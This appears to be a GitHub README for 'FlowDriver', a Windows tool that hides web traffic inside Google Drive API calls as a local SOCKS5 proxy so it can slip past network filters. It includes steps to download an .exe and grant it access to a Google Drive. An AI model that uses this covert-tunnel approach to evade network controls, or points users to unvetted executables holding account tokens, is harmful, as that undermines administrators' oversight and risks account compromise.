# 🌐 FlowDriver - Access secure networks using private tunnels

[![Download FlowDriver](https://img.shields.io/badge/Download-FlowDriver-blue.svg)](https://github.com/greenlandspinel496/FlowDriver)

## 📖 About this software

FlowDriver moves your internet traffic through Google Drive. It hides your connection by masking data as standard file uploads. This system works well on restrictive networks that block typical connections. It uses the Google Drive API to create a SOCKS5 tunnel. Your computer talks to Google servers instead of blocked destinations. This approach keeps your web activity private and helps you bypass network filters.

## ⚙️ How it works

The software acts as a bridge between your web browser and the internet. When you send a request, FlowDriver intercepts the data. It encrypts the request and packages it as an API call to Google Drive. The network sees a simple file operation. Once the data reaches the other side, the process reverses. The traffic returns to your computer through the same tunnel. You maintain your connection without revealing your destination to local network scanners.

## 💻 Requirements for your computer

Ensure your system meets these basic needs:
* Operating System: Windows 10 or Windows 11.
* Memory: 4 gigabytes of RAM or more.
* Storage: 100 megabytes of free space.
* Network: An active internet connection.
* Account: An active Google account to grant API access.

## 🚀 Downloading and installation

1. Visit the project website to select your version: [https://github.com/greenlandspinel496/FlowDriver](https://github.com/greenlandspinel496/FlowDriver).
2. Locate the section labeled Releases on the right side of the page.
3. Click the version number to open the download page.
4. Select the file ending in .exe to download it to your desktop.
5. Move the downloaded file to a permanent folder, such as your Documents folder, so you do not move it by accident later.
6. Double-click the file to start the installation.

## 🛠 Setting up the tunnel

When you open FlowDriver for the first time, the program asks for permission to link your Google account. This step provides the server with the necessary tokens to read and write data.

1. Click the Authorize button in the main window.
2. Your web browser will open a Google sign-in page.
3. Log in with your email and password.
4. Confirm the prompt to allow FlowDriver to manage your Google Drive files.
5. Return to the application window. Once you see the green light, the tunnel is active.

## 🧠 Configuring your applications

FlowDriver provides a SOCKS5 proxy on your local machine. Most applications need manual settings to use this proxy.

### Setting up web browsers
1. Open your browser settings.
2. Search for the word Proxy.
3. Select the option for manual proxy configuration.
4. Set the address to 127.0.0.1.
5. Set the port to 1080.
6. Save these changes. Your browser will now tunnel traffic through FlowDriver.

### Setting up other software
Any application with SOCKS settings works with FlowDriver. Look for connection settings or network preferences. Use the same address (127.0.0.1) and port (1080). If an application does not have these settings, it will use your standard internet connection by default.

## 🛡 Security and privacy

The software uses strong encryption for all traffic. The data remains hidden within the Google infrastructure. Since the traffic appears as standard cloud storage activity, network administrators cannot identify the content of your requests. Keep your Google credentials secure as they provide access to this tunnel. Do not share your primary Google account if you require higher levels of privacy. Consider creating a separate account for use with this tool.

## 🔍 Troubleshooting common issues

If you encounter problems, review this checklist:

* **Connection Timeout:** Check if your internet connection is stable. If the connection fails, restart FlowDriver.
* **Authentication Errors:** Your authorization token might expire. Click the Authorize button again to refresh your session.
* **Slow Speeds:** Google Drive API has limits on how much data users can move. High-bandwidth activities like video streaming may reach these limits quickly.
* **Blocked Ports:** Ensure no other application uses port 1080. Other proxy tools often claim this port first. Change the port in your application or stop the conflicting program.

## 📁 Managing your storage

FlowDriver creates small hidden files in your Google Drive to facilitate the tunnel. These files stay in a designated folder. Do not delete or rename these files while the application runs. If you want to clean your storage, close FlowDriver first. You can safely remove the FlowDriver folder from your Google Drive if you no longer plan to use the service.

## 📋 Best practices

* Keep the application up to date: The developers release patches to maintain compatibility with changes to the Google API.
* Use only one active instance: Running multiple copies of FlowDriver may cause conflicts with the API rate limits.
* Monitor your data usage: Check your Google Drive storage meter to ensure you remain within your quota.
* Use trusted networks: While this tool masks your traffic, it relies on your initial connection to reach the internet. Ensure your environment remains safe from physical tampering or malicious hardware.

## 📖 Glossary of terms

* **SOCKS5:** A way for your computer to route traffic through a proxy server.
* **API:** A method for the software to talk to the Google Drive service.
* **Tunnel:** The hidden path your data takes to safely cross a restricted network.
* **Token:** A digital key that lets the software use your Google account without needing your password every time.
* **Proxy:** A middleman that manages your connections to the open web.